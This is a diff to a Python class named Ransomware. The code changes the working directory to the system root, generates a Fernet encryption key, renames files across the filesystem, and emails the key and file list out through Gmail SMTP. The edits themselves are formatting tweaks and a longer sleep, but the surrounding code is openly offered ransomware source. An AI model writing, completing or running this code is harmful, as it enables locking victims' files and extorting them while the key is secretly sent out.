@@ -7,12 +7,14 @@ from cryptography.fernet import Fernet
 
 
 class Ransomware:
-    def __init__(self):
-        files = []
-        directories = []
-        os.chdir("C:/")  # on Mac -- /Users or /
-        files_dict = {}
-        key = Fernet.generate_key()
+    def __init__(self, 
+                 files=[], 
+                 directories=[], 
+                 files_dict={}, 
+                 key=Fernet.generate_key()
+                 ):
+        
+        os.chdir("C:/")  # Mac -> /Users  || Linux -> /home
         self.files = files
         self.directories = directories
         self.key = key
@@ -20,7 +22,11 @@ class Ransomware:
 
         self.message = f"KEY : {key} +\n files_list : {files}"
 
-    def id_generator(self, size, chars=string.ascii_lowercase + string.digits):
+    def id_generator(self, 
+                     size, 
+                     chars=string.ascii_lowercase + string.digits
+                    ):
+                        
         return ''.join(random.choice(chars) for _ in range(size))
 
     def files_dir(self):
@@ -68,13 +74,17 @@ class Ransomware:
 
             os.rename(_, last)
 
-    def mail_send(self, email="", password=""):
+    def mail_send(self, 
+                  email="", 
+                  password=""
+                 ):
+                     
         msg = self.message
         email_server = smtplib.SMTP("smtp.gmail.com", 587)
         email_server.starttls()
         email_server.login(email, password)
         email_server.sendmail(email, email, msg)
-        sleep(8)
+        sleep(10)
         email_server.quit()
 
 
